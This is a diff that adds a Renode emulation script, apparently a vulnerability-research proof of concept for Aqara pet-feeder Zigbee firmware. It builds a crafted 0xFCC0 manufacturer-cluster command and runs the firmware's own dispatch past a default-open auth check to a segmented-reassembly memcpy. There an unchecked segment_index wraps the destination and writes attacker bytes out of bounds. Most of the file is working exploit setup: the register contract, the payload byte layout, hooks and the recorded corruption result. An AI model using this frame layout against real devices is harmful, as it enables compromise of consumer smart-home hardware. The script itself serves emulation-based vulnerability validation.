@@ -1,0 +1,138 @@
+:name: ZB-02 Aqara feeder — ZCL-DISPATCH-INJECTION reachability PoC (mfg-cluster gate -> heap-OOB SINK)
+:description: Injects an ALREADY-DECRYPTED PLAINTEXT manufacturer-specific 0xFCC0 ZCL command at the firmware's emberCommandReceivedCallback gate sub_14EB4 and lets the real Aqara feeder firmware's OWN code run the mfg-cluster/commandId/msg_type classification, the auth gate sub_17b7c, and the segmented-reassembly router sub_14DEC, reaching the vulnerable segmented-reassembly heap-OOB sink sub_14D08. No PC is forced into the gate, the router, or the sink: only the dispatcher ENTRY sub_14EB4 is entered with the argument contract the RX chain (sub_1CD38 -> j_sub_5972 -> sub_14EB4) would set up. This closes two axes the function-level PoC (zb02_validate.resc, which forces PC straight into sub_14D08) skips: (1) GATE REACHABILITY (the firmware's own gate routes clusterId-0xFCC0/cmdId-2/msgType-0xFFF1 to the sink) and (2) PARAMETER FIDELITY (the attacker segment_index flows UNCLAMPED to the OOB offset).
+#
+# ============================ RESULT (reproduced 2026-07-13) ============================
+#   Marker order (all NATURAL, fired by the firmware's own branches/calls):
+#       MARK_14EB4_GATE -> MARK_14DEC_ROUTER -> MARK_14D08_SINK -> MARK_14D8C_MEMCPY
+#     (extended per-check trace confirmed the natural gate passed clusterId==0xFCC0,
+#      commandId==2, and msg_type==0xFFF1 in order before calling the router.)
+#     MARK_GATE_REJECT / MARK_AUTH_REJECT did NOT fire.
+#   OOB target slot 0x20014FC4 (= alloc base 0x20005000 + wrapped offset 0xFFC4):
+#       0x00000000 (before)  ->  0x41414141 (after)
+#   => The firmware's OWN dispatch routed the injected mfg-specific frame through the
+#      full gate to sub_14D08, and the unbounded attacker segment_index (=0) wrapped the
+#      destination offset to (uint16)(60*-1)=0xFFC4=65476, so the attacker payload bytes
+#      were memcpy'd 65476 bytes ABOVE the reassembly buffer base via the natural path.
+#
+# ============================ FORCED vs NATURAL ============================
+#   FORCED (emulation scaffolding, minimal):
+#     * The plaintext ZCL command-context struct + payload are written into scratch
+#       RAM and the CPU is entered at sub_14EB4 (0x14EB4) with r0 = &cmd exactly as
+#       the RX chain would pass it. This deliberately BYPASSES NWK/APS decryption,
+#       APS addressing/endpoint routing, and the ZCL-header decode that builds `cmd`.
+#     * Two device-state cells are pre-seeded: the default-open auth flag *0x2000495E
+#       (=0) and the segmented-reassembly state (bitmask nonzero so the sink SKIPS the
+#       allocator; alloc base = known 0x20005000) so the OOB write lands at a
+#       deterministic observable address. Neither pre-seed touches a gate field or the
+#       attacker-controlled segment_index; they only make the write observable and
+#       reflect a device in its factory default-open state.
+#     * The firmware's own DEBUG-PRINT helpers sub_1b810/sub_1b7d8 are stubbed to
+#       `bx lr`. On the accepted path sub_14EB4 emits an enabled debug log (BL 0x1b810
+#       at 0x14F52, between the msg_type check and the router call); its output routine
+#       spins forever on the emulated debug-UART TX-ready flag (an emulation artifact:
+#       on real silicon the byte is drained and the call returns). Stubbing it removes
+#       ONLY that console-I/O side effect; it does not touch the gate, the router, the
+#       sink, or any attacker data. (Without the stub the natural path is identical up
+#       to and including MARK_14F44_msgtype_ok, then hangs inside the log emitter.)
+#   NATURAL (firmware's own execution, from sub_14EB4 down — NO forced PC):
+#     * sub_14EB4 checks cmd[0xe]==0, then aps->clusterId (cmd[0][+2]) == 0xFCC0
+#       (0x14EDC), then cmd[0x13]==2 (0x14EF0), then parses msg_type via sub_1ae64
+#       (little-endian payload[r5+0..1]) and requires it == 0xFFF1 (0x14F40). Only
+#       then does it call sub_14DEC (0x14F62).
+#     * sub_14DEC calls the auth gate sub_17b7c; when *0x2000495E==0 it returns 0
+#       (default-open) so sub_14DEC continues, sees frame[0]!=0 (segmented) and
+#       TAIL-CALLS the sink sub_14D08(r0=frame, r1=len&0xff, r2=ctx) at 0x14E5C.
+#     * sub_14D08 reads segment_index = frame[2] with NO bound check, computes
+#       dest = alloc_base + (uint16)(60*(segment_index-1)) and memcpy's (len-3)
+#       attacker bytes there (BL sub_3D856 at 0x14D8C). With segment_index=0 the
+#       offset wraps to (uint16)(60*-1) = 0xFFC4 = 65476.
+#
+# ============================ ARG CONTRACT AT sub_14EB4 (r0 = &cmd) ============================
+#   cmd[0x00] = ptr to APS/ZCL header; header[+2] (u16) = clusterId  (gate: == 0xFCC0)
+#   cmd[0x08] = ptr to ZCL payload buffer
+#   cmd[0x0c] = payload length bound (u16)      cmd[0x0e] = flag byte (gate: == 0)
+#   cmd[0x12] = ctx byte (-> sink r2)           cmd[0x13] = commandId (gate: == 2)
+#   cmd[0x14] = payload base offset r5 (=0 here)
+#   payload[r5+0..1] = msg_type (gate: == 0xFFF1)   payload[r5+3] = MIoT length
+#   payload[r5+4]=segmented flag(!=0)  [r5+5]=num_segments  [r5+6]=segment_index(UNBOUNDED)
+#   payload[r5+7..] = attacker data (copied by the sink)
+# =======================================================================================
+
+$bin=@scripts/silabs-vuln/zb02_aqara.elf
+include @scripts/silabs-vuln/boot_mg21.resc
+logLevel 3
+
+# COLD chain hooks (each executes once on this path -> no flooding).
+cpu AddHook 0x14eb4 "self.ErrorLog('MARK_14EB4_GATE')"
+cpu AddHook 0x14dec "self.ErrorLog('MARK_14DEC_ROUTER')"
+cpu AddHook 0x14d08 "self.ErrorLog('MARK_14D08_SINK')"
+cpu AddHook 0x14d8c "self.ErrorLog('MARK_14D8C_MEMCPY')"
+cpu AddHook 0x14ec0 "self.ErrorLog('MARK_GATE_REJECT')"
+cpu AddHook 0x14e60 "self.ErrorLog('MARK_AUTH_REJECT')"
+# Halt cleanly right after the memcpy returns (copy already done), so the CPU does not
+# free-run into the sentinel-LR region (which stalls a single Step on a peripheral read).
+cpu AddHook 0x14d90 "self.ErrorLog('MARK_14D90_POST_MEMCPY') ; self.IsHalted = True"
+
+# Boot through clock/power/radio bring-up (verify PC advances, not stuck).
+emulation RunFor "0.3"
+pause
+echo ">>> post-boot PC (expect advanced past reset vector):"
+cpu PC
+
+# --- FORCED: stub the emulation-blocking debug-print helpers to `bx lr` (0x4770) ------
+sysbus WriteWord 0x1b810 0x4770
+sysbus WriteWord 0x1b7d8 0x4770
+
+# --- FORCED PRE-SEED device state ----------------------------------------------------
+# Default-open auth flag: sub_17b7c returns *0x2000495E; 0 => auth gate passes naturally.
+sysbus WriteByte 0x2000495E 0x00
+# Segmented-reassembly state (r10 base literal @0x14de8 = 0x20004608):
+#   [+0]=state word, [+4]=bitmask (nonzero => sink SKIPS allocator), [+8]=alloc base.
+sysbus WriteDoubleWord 0x20004608 0x00000000
+sysbus WriteDoubleWord 0x2000460C 0x00000002
+sysbus WriteDoubleWord 0x20004610 0x20005000
+
+# --- Build the ZCL command-context struct `cmd` @0x20005600 (r0 at sub_14EB4) --------
+sysbus WriteDoubleWord 0x20005600 0x20005700
+sysbus WriteDoubleWord 0x20005604 0x00000000
+sysbus WriteDoubleWord 0x20005608 0x20005800
+sysbus WriteDoubleWord 0x2000560C 0x00000020
+sysbus WriteDoubleWord 0x20005610 0x02000000
+sysbus WriteDoubleWord 0x20005614 0x00000000
+# APS/ZCL header stand-in @0x20005700: header[+2] (u16) = 0xFCC0 (manufacturer cluster).
+sysbus WriteDoubleWord 0x20005700 0xFCC00000
+
+# --- Plaintext MIoT 0xFCC0 command payload @0x20005800 (cmd[0x08]) -------------------
+#   [0..1]=msg_type 0xFFF1 (LE F1 FF)  [2]=attr_type 0  [3]=MIoT len 0x13 (=> copy 16)
+#   [4]=segmented flag 0x01(!=0)  [5]=num_segments 0x01  [6]=segment_index 0x00(->wrap)
+#   [7..22]=16 x 0x41 attacker data
+sysbus WriteDoubleWord 0x20005800 0x1300FFF1
+sysbus WriteDoubleWord 0x20005804 0x41000101
+sysbus WriteDoubleWord 0x20005808 0x41414141
+sysbus WriteDoubleWord 0x2000580C 0x41414141
+sysbus WriteDoubleWord 0x20005810 0x41414141
+sysbus WriteDoubleWord 0x20005814 0x00414141
+
+# --- Observe the OOB destination before ----------------------------------------------
+echo ">>> BEFORE: OOB target 0x20014FC4 (= base 0x20005000 + wrapped 0xFFC4) ="
+sysbus ReadDoubleWord 0x20014FC4
+sysbus AddWatchpointHook 0x20014FC4 DoubleWord Write "self.ErrorLog('>>> WATCHPOINT: attacker OOB write @0x20014FC4 (base+65476) value=0x{0:X}'.format(value))"
+
+# --- Register contract the RX chain hands sub_14EB4 ----------------------------------
+#   r0 = &cmd    SP = fresh scratch stack    LR = sentinel (return would fault; ok)
+sysbus.cpu SetRegister 0  0x20005600
+sysbus.cpu SetRegister 13 0x2000FF00
+sysbus.cpu SetRegister 14 0x20005901
+sysbus.cpu PC 0x14EB4
+
+# Bounded window; the 0x14d90 hook halts the CPU right after the copy completes, so this
+# returns promptly and never free-runs past the sink.
+emulation RunFor "0.002"
+pause
+
+echo ">>> AFTER: PC ="
+cpu PC
+echo ">>> AFTER: OOB target 0x20014FC4 (expect 0x41414141) ="
+sysbus ReadDoubleWord 0x20014FC4
+echo ">>> (markers above: 14EB4_GATE -> 14DEC_ROUTER -> 14D08_SINK -> 14D8C_MEMCPY = natural dispatch)"
+quit
